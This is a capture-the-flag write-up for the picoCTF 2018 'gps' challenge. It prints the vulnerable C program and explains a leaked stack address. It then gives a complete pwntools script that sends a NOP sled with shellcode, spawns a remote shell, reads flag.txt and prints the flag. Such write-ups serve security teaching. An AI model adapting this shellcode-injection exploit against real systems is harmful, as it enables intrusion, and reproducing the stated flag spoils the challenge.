# Problem
You got really lost in the wilderness, with nothing but your trusty [gps](https://2018shell1.picoctf.com/static/9c6c7d4d93c2157acac968595e051244/gps). Can you find your way back to a shell and get the flag? Connect with ```nc 2018shell1.picoctf.com 58896```. ([Source](https://2018shell1.picoctf.com/static/9c6c7d4d93c2157acac968595e051244/gps.c)).

## Hints:
Can you make your shellcode randomization-resistant?

## Solution:

Lets download the files:
```bash
wget https://2018shell1.picoctf.com/static/9c6c7d4d93c2157acac968595e051244/gps
wget https://2018shell1.picoctf.com/static/9c6c7d4d93c2157acac968595e051244/gps.c
chmod +x ./gps
```

Lets take a look at the source:
```c
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#define GPS_ACCURACY 1337

typedef void (fn_t)(void);

void initialize() {
    printf("GPS Initializing");
    for (int i = 0; i < 10; ++i) {
        usleep(300000);
        printf(".");
    }
    printf("Done\n");
}

void acquire_satellites() {
    printf("Acquiring satellites.");
    for (int i = 0; i < 3; ++i) {
        printf("Satellite %d", i);
        for (int j = 0; j < rand() % 10; ++j) {
            usleep(133700);
            printf(".");
        }
        if (i != 3) {
            printf("Done\n");
        } else {
            printf("Weak signal.\n");
        }
    }

    printf("\nGPS Initialized.\n");
    printf("Warning: Weak signal causing low measurement accuracy\n\n");
}

void *query_position() {
  char stk;
  int offset = rand() % GPS_ACCURACY - (GPS_ACCURACY / 2);
  void *ret = &stk + offset;
  return ret;
}


int main() {
    setbuf(stdout, NULL);

    char buffer[0x1000];
    srand((unsigned) (uintptr_t) buffer);

    initialize();
    acquire_satellites();

    printf("We need to access flag.txt.\nCurrent position: %p\n", query_position());

    printf("What's your plan?\n> ");
    fgets(buffer, sizeof(buffer), stdin);

    fn_t *location;

    printf("Where do we start?\n> ");
    scanf("%p", (void**) &location);

    location();
    return 0;
}
```

```query_position()``` gives us the address of the local ```stk``` (in other words, pointer neer the top of the stack) with an offset of +- ```1337 / 2```.
After that, we can send a buffer and an address which will be executed.

The strategy is to send a shellcode (with a [NOP sled](https://en.wikipedia.org/wiki/NOP_slide)) for the buffer, and the address we recieved from ```query_position()``` as the location. If we got lucky (which is highly probable), we will hit the NOP sled and our shellcode will be executed.

Code:
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = ''
pw = ''

context.arch = 'amd64'

if debug:
  p = process('./gps')
else:
  p = remote('2018shell1.picoctf.com', 58896)

lines = p.recvuntil('>').split('\n')

print '\n'.join(lines)

current_position = lines[-3].split(':')[1].strip()
log.info('Current position: {}'.format(current_position))

log.info('Sending shellcode')
p.sendline("\x90" * 900 + asm(shellcraft.sh()))

print p.recvuntil('>')

location = int(current_position[2:], 16)

log.info('Sending position 0x{:x}'.format(location))
p.sendline('0x{:x}'.format(location))

if debug:
  p.sendline('ls')
else:
  p.sendline('cat flag.txt')
  p.sendline('exit')

print p.recvall()
```

The output (when got lucky):
```bash
[+] Opening connection to 2018shell1.picoctf.com on port 58896: Done
GPS Initializing..........Done
Acquiring satellites.Satellite 0..Done
Satellite 1Done
Satellite 2...Done

GPS Initialized.
Warning: Weak signal causing low measurement accuracy

We need to access flag.txt.
Current position: 0x7ffef4b79b4b
What's your plan?
>
[*] Current position: 0x7ffef4b79b4b
[*] Sending shellcode
 Where do we start?
>
[*] Sending position 0x7ffef4b79b4b
[+] Receiving all data: Done (53B)
[*] Closed connection to 2018shell1.picoctf.com port 58896
 picoCTF{s4v3_y0urs3lf_w1th_a_sl3d_0f_n0ps_gfjdcwma}
```

Flag: picoCTF{s4v3_y0urs3lf_w1th_a_sl3d_0f_n0ps_gfjdcwma}